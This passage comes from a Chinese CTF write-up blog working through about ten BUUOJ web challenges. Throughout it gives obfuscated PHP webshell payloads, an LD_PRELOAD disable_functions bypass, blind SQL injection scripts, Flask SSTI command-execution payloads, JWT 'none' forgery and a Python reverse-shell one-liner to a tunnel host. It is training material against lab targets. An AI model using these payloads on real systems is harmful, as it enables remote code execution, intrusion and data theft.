?&gt; 有eval函数，要试图命令执行，然后preg_match过滤了字母和数字，这里可以利用异或或者是url编码取反来绕过 取反 成功执行 这里可以看到禁用的函数 或者利用异或 code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo 一样可以进入phpinfo页面 查看到禁用的函数后可以尝试利用取反或者异或写入一句话木马 //抄的payload ?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); &#x2F;&#x2F;别忘了后面的分号 或者： ?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27]) 然后蚁剑链接，要执行读取flag的readflag二进制文件才能得到flag 但是 disable_functions禁用的函数太多导致shell不能执行命令 这里可以用蚁剑的插件 还有一种方法 利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE参考链接：https://www.anquanke.com/post/id/175403 无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户 EXP地址 我看不懂，但我大受震撼 上传bypass.php &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;; $cmd &#x3D; $_GET[&quot;cmd&quot;]; $out_path &#x3D; $_GET[&quot;outpath&quot;]; $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;; putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;设置EVIL_CMDLINE环境变量 $so_path &#x3D; $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path); &#x2F;&#x2F;加载恶意动态库 mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); &#x2F;&#x2F;利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。 echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;; unlink($out_path); ?&gt; 最终payload http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so 参考链接 bypass_disable_functions | 0xCreed (jxustctf.top) [BUUOJ记录] [极客大挑战 2019]RCE ME - Ye&#39;sBlog - 博客园 (cnblogs.com) 极客大挑战 2019]RCE ME_末初 · mochu7-CSDN博客 极客大挑战 2019]RCE ME（取反、异或绕过正则表达式、bypass disable_function）_WHOAMIAnony的博客-CSDN博客_异或绕过 [BSidesCF 2019]Kookie 不知道密码，sql注入也不成功 直接把cookie改成username=cookie就行了，不清楚这题在考啥。。。 [WUSTCTF2020]颜值成绩查询布尔盲注，过滤了空格 (ascii(substr(database(),{},1))={})&quot;.format(i,j) (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={}) (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={}) (ascii(substr((select(group_concat(value))from(flag)) 脚本： import requests url &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot; data &#x3D; &#39;&#39; k &#x3D; 0 for i in range(13,50): k &#x3D; 0 for j in range(43,127): gets &#x3D; &quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j) res &#x3D; requests.get(url+gets) if &quot;your score is: 100&quot; in res.text: data +&#x3D; chr(j) print(data) k &#x3D; 1 break if(k &#x3D;&#x3D; 0): print(&quot;err!&quot;) exit() 因为网络问题加了判断，结果就是跑一会就停了，只能一段一段的跑了 一定是buu flag太长了（ 算是第一次自己写脚本了 遍历属实跑的太慢了，抽空学一下二分法的写法 flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4} [GWCTF 2019]枯燥的抽奖 涉及了php的伪随机 如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的 查看源码找到check.php pbEzqyRCJP &lt;?php #这不是抽奖程序的源代码！不许看！ header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(!isset($_SESSION[&#39;seed&#39;]))&#123; $_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999); &#125; mt_srand($_SESSION[&#39;seed&#39;]); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123; $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125; $str_show &#x3D; substr($str, 0, 10); echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;; if(isset($_POST[&#39;num&#39;]))&#123; if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;; &#125; &#125; show_source(&quot;check.php&quot;); 知道前几位了 根据生成算法逆向出满足php_mt_seed工具要求的参数（百度抄的 str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39; str2&#x3D;&#39;pbEzqyRCJP&#39; str3 &#x3D; str1[::-1] length &#x3D; len(str2) res&#x3D;&#39;&#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] &#x3D;&#x3D; str1[j]: res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39; break print(res) #15 15 0 61 1 1 0 61 40 40 0 61 25 25 0 61 16 16 0 61 24 24 0 61 53 53 0 61 38 38 0 61 45 45 0 61 51 51 0 61 放到php_mt_seed里跑种子 再利用这个脚本得到最后的值 &lt;?php mt_srand(499600072); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123; $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125; echo $str; ?&gt; 吐槽一下，工业互联网的时候看见一个类似的题，照着这个题的wp没跑出来，今天才知道是php_mt_seed的问题，虽然感觉很离谱 官网下的爆不出seed，从这里下的可以Index of /pub/projects/php_mt_seed (openwall.net) 还有就是一样的种子在php版本不一样的时候出来的值也不一样 [Zer0pts2020]Can you guess it?&lt;?php include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php if (preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;); &#125; if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit(); &#125; $secret &#x3D; bin2hex(random_bytes(64)); if (isset($_POST[&#39;guess&#39;])) &#123; $guess &#x3D; (string) $_POST[&#39;guess&#39;]; if (hash_equals($secret, $guess)) &#123; $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG; &#125; else &#123; $message &#x3D; &#39;Wrong.&#39;; &#125; &#125; ?&gt; &lt;!doctype html&gt; &lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt; &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt; &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt; &lt;hr&gt; &lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt; &lt;?php &#125; ?&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt; &lt;input type&#x3D;&quot;submit&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 这里我本来以为是php伪随机数的漏洞，结果最后查了一下发现是basename函数的漏洞 它会忽略后面的[\\x80-\\xff]范围内的字符串，即非ascii字符。例子如下： php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\\x80&quot;));&#39; &#x2F;&#x2F; config.php php -r &#39;print(basename(&quot;\\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php $_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php/\\x80?source来读取flag。 [CISCN2019 总决赛 Day2 Web1]Easyweb源码泄露 下载image.php.bak &lt;?php include &quot;config.php&quot;; $id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;; $path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;; $id&#x3D;addslashes($id); $path&#x3D;addslashes($path); $id&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id); $path&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path); $result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;); $row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC); $path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;]; header(&quot;Content-Type: image&#x2F;jpeg&quot;); readfile($path); GET方式传入变量id的值，若没有则为1GET方式传入变量path的值，若没有则为空addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，单引号（&#39;）、双引号（&quot;）、反斜杠（\\）str_replace()函数将两个变量内的\\0、%00、&#39;、&#39;都替换为空将变量$id与$path拼接进SQL语句脚本： import requests url &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\\\0&#39;&amp;path&#x3D;&quot; payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot; payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; database &#x3D; &quot;&quot; for i in range(1,1000): low &#x3D; 32 high &#x3D; 128 mid &#x3D; (low + high) &#x2F;&#x2F; 2 while(low &lt; high): payload &#x3D; payload4.format(i,mid) new_url &#x3D; url + payload r &#x3D; requests.get(new_url) if &quot;JFIF&quot; in r.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (low + high) &#x2F;&#x2F; 2 if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128): break database +&#x3D; chr(mid) print(database) 得到密码和用户名登录 登录后是个文件上传的页面 这里要用文件名传一句话木马 在上传后的目录可以看到上传的文件名但是不能访问上传文件的内容 不能用php就用短标签代替 [CSCCTF 2019 Qual]FlaskLight一眼ssti，然后就不会了（ f12看到源码注释，get方式，参数为search 试一下传&#123;&#123;7*7&#125;&#125;确定是ssti config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值。 &#123;&#123; config.items() &#125;&#125; &#x2F;&#x2F; 查看配置项目的信息 &#123;&#123;(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]&#125;&#125; 例一：warnings.catch_warnings类 &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’] 最后获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125; 例二： class’site._Printer’类 &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; 获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125; 例三：popen &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125; [HITCON 2017]SSRFme进去后是php代码 直接抄的其他师傅的注释 &lt;?php if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123; $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]); &#x2F;&#x2F; explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。 $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0]; &#125; echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F; “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 @mkdir($sandbox); @chdir($sandbox); &#x2F;&#x2F; 改变当前的目录到$sandbox $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); &#x2F;&#x2F; escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数 $info &#x3D; pathinfo($_GET[&quot;filename&quot;]); &#x2F;&#x2F; pathinfo() 函数以数组的形式返回文件路径的信息。 $dir &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); &#x2F;&#x2F; basename() 函数返回路径中的文件名部分。 @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); &#x2F;&#x2F; 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。 简单来说就是利用传参中的url执行命令，然后将结果保存在filename中 有几个地方不太懂 ​ 1.百度的wp都说这里利用的perl脚本里的open漏洞 利用GET中的open函数漏洞。 open函数在GET命令被调用时执行，也就是第五行执行GET命令时，perl语言会调用open命令，漏洞就存在于open命令对于文件的处理上，关于这个漏洞，外国人有文章，是这样写的：Perl saw that your “file” ended with a “pipe” (vertical bar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”&#39;s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you. 翻译过来意思是 perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。 ​ 2.这里执行url传入的命令的前提是要求有个以该命令命名的文件 ?url=/&amp;filename=1.txt 看一下根目录 有两个和flag有关的文件，试flag无果，只能试试readflag ?url=&amp;filename=bash -c /readflag| 先创建一个bash -c /readflag|的文件 ?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 利用url执行命令 /sandbox/md5值/bash -c /readflag| [FBCTF2019]RCEService json格式 cmd 可以猜到执行命令格式是 {&quot;cmd&quot;:&quot;ls&quot;} 还可以直接get参数进去 但是cat参数没法直接用，还有过滤，不过可以用换行符绕过过滤 &lt;?php putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;); 设置了环境变量的PATH，导致不能使用相对路径，只能用绝对路径： if (isset($_REQUEST[&#39;cmd&#39;])) &#123; $json &#x3D; $_REQUEST[&#39;cmd&#39;]; if (!is_string($json)) &#123; echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;; &#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\&#x2F;;-@\\[-&#96;|~\\x7F]+).*$&#x2F;&#39;, $json)) &#123; echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;; &#125; else &#123; echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;; $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;]; if ($cmd !&#x3D;&#x3D; NULL) &#123; system($cmd); &#125; else &#123; echo &#39;Invalid input&#39;; &#125; echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;; &#125; &#125; ?&gt; cat命令不能直接用，原因可能是当前的PATH下没有cat，这里需要也需要用绝对路径： Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 cat 读出源码（我也很想知道网上的wp没源码之前怎么想到这么绕过的 然后找flag在的目录 找到之后利用cat读出来 [HFCTF2020]EasyLogin注册个账号，登录，看到有个getflag但是提示权限不够 查看源码发现全是js的 看一下app.js &#x2F;** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD *&#x2F; function login() &#123; const username &#x3D; $(&quot;#username&quot;).val(); const password &#x3D; $(&quot;#password&quot;).val(); const token &#x3D; sessionStorage.getItem(&quot;token&quot;); $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;) .done(function(data) &#123; const &#123;status&#125; &#x3D; data; if(status) &#123; document.location &#x3D; &quot;&#x2F;home&quot;; &#125; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; function register() &#123; const username &#x3D; $(&quot;#username&quot;).val(); const password &#x3D; $(&quot;#password&quot;).val(); $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;) .done(function(data) &#123; const &#123; token &#125; &#x3D; data; sessionStorage.setItem(&#39;token&#39;, token); document.location &#x3D; &quot;&#x2F;login&quot;; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; function logout() &#123; $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123; const &#123;status&#125; &#x3D; data; if(status) &#123; document.location &#x3D; &#39;&#x2F;login&#39;; &#125; &#125;); &#125; function getflag() &#123; $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123; const &#123;flag&#125; &#x3D; data; $(&quot;#username&quot;).val(flag); &#125;).fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; 提示是基于Node.js的koa框架，但是这个页面的代码并不是逻辑代码，用处不大。在注释里提示静态文件处理出现问题，那么可能会出现任意文件读取漏洞 这里需要对koa框架的目录有一定的了解 访问一下controllers路径下的api.js 额，这里赵总说是经验。。。 const crypto = require('crypto'); const fs = require('fs') const jwt = require('jsonwebtoken') const APIError = require('../rest').APIError; module.exports = &#123; 'POST /api/register': async (ctx, next) => &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || username === 'admin')&#123; throw new APIError('register error', 'wrong username'); &#125; if(global.secrets.length > 100000) &#123; global.secrets = []; &#125; const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: 'HS256'&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, 'POST /api/login': async (ctx, next) => &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || !password) &#123; throw new APIError('login error', 'username or password is necessary'); &#125; const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid >= 0)) &#123; throw new APIError('login error', 'no such secret id'); &#125; const secret = global.secrets[sid]; const user = jwt.verify(token, secret, &#123;algorithm: 'HS256'&#125;); const status = username === user.username &amp;&amp; password === user.password; if(status) &#123; ctx.session.username = username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, 'GET /api/flag': async (ctx, next) => &#123; if(ctx.session.username !== 'admin')&#123; throw new APIError('permission error', 'permission denied'); &#125; const flag = fs.readFileSync('/flag').toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, 'GET /api/logout': async (ctx, next) => &#123; ctx.session.username = null; ctx.rest(&#123; status: true &#125;) await next(); &#125; &#125;; 赵总wp里的审计: 注册 /api/register，接受传入的 username 和 password，先判断 username 不为 admin，然后生成一个 key 来以这些信息为依据，生成一个 jwt 令牌，key 同时存入全局数组。 登录 /api/login，接受传入的 username 和 password，然后从令牌的信息段中取 key 的 id，从程序中的全局数组取出 key，然后进行验证，验证通过之后置 session 中的 username 为登录时使用的 username。 获取FLAG /api/flag，判断 session 中的用户名是否为 admin，是的话就直接给 flag。 可以看到信息是用 jwt 令牌储存的，使用 jsonwebtoken 库来操作，这里用的是 HS256加密，但经过测试发现，当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样很轻松地就可以伪造一个 username 为 admin 的 jwttoken 了。 在登录界面抓包后边这串就是jwt（当时忘了截图，这是改完jwt之后的了 之后在JSON Web Tokens - jwt.io里解码 接下来也是赵总的分析： 回到源程序逻辑中，若想让这里的密钥 key为空，就需要修改上面的 secretid。那么就尝试修改 secretid，使其无法作为全局变量 secrets 数组的索引，那么 secret 就会为空了。 注意，这里还有一个验证，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。乍看之下没有操作空间，怎么整都会取出 密钥 key。但别忘了 JavaScript 是一门弱类型语言，NodeJS 都是 JS 的语法，那自然也是咯。所以我们只要选择恰当的数据来绕过这个判断即可。可以做一个小实验来验证我们的想法。 一个小实验，空数组与数字比较永远为真，当然用空字符串之类的也可以 最后利用python的PyJWT库来加密 抓包再放包就可以读取这个flag 虎符 CTF Web 部分 Writeup – glzjin (zhaoj.in) [b01lers2020]Welcome to Earth抓包之后一直往下走 源码里找不到就去看js 最后可以找到一个 随机排列组合得到flag from itertools import permutations flag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;] item &#x3D; permutations(flag)#对flag全排列，返回的是iterators（迭代器） for i in item: k &#x3D; &#39;&#39;.join(i)#join连接成为字符串 if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;这里还可以用python的startswich方法判断是否是pctf&#123;hey开头 &#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;: print(k) [watevrCTF-2019]Cookie Store抓session，base64解码把金额改成100，放包 [网鼎杯 2020 白虎组]PicDown 源码没东西，只有个url的get参数，还以为是ssrf之类的，搜了下wp，这里可能是因为环境原因，有个非预期解 非预期解： 有文件读取，直接url=/flag就能下载一个beautiful.jpg,改成txt就能看见flag 预期解： /proc/self/目录的意义 我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。 读一下app.py url=app.py from flask import Flask, Response from flask import render_template from flask import request import os import urllib app &#x3D; Flask(__name__) SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot; f &#x3D; open(SECRET_FILE) SECRET_KEY &#x3D; f.read().strip() os.remove(SECRET_FILE) @app.route(&#39;&#x2F;&#39;) def index(): return render_template(&#39;search.html&#39;) @app.route(&#39;&#x2F;page&#39;) def page(): url &#x3D; request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res &#x3D; urllib.urlopen(url) value &#x3D; res.read() response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;) response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39; return response else: value &#x3D; &quot;HACK ERROR!&quot; except: value &#x3D; &quot;SOMETHING WRONG!&quot; return render_template(&#39;search.html&#39;, res&#x3D;value) @app.route(&#39;&#x2F;no_one_know_the_manager&#39;) def manager(): key &#x3D; request.args.get(&quot;key&quot;) print(SECRET_KEY) if key &#x3D;&#x3D; SECRET_KEY: shell &#x3D; request.args.get(&quot;shell&quot;) os.system(shell) res &#x3D; &quot;ok&quot; else: res &#x3D; &quot;Wrong Key!&quot; return res if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080) 可以看到no_one_know_the_manager中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了 但是这个文件是用open打开的，会创建文件描述符。 我们读这个文件描述符中的内容就好了此处可以通过/proc/pid/fd/读取，这个目录包含了进程打开的每一个文件的链接 拿到key的内容，要url编码，但是shell执行的命令不会返回，这里使用反弹shell的方式，在根目录下读取flag nmd弹了几个小时终于弹tan出来了 没公网ip，搞了个端口映射后的公网 (23条消息) 端口映射后的公网反弹shell_来到了学渣的博客-CSDN博客 https://natapp.cn/register 把本地的8082端口映射到公网 把这个payload当shell参数的值打进去 python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; 然后在Ubuntu里监听8082端口，从根目录里找到flag 泪目 [HarekazeCTF2019]encode_and_encode source 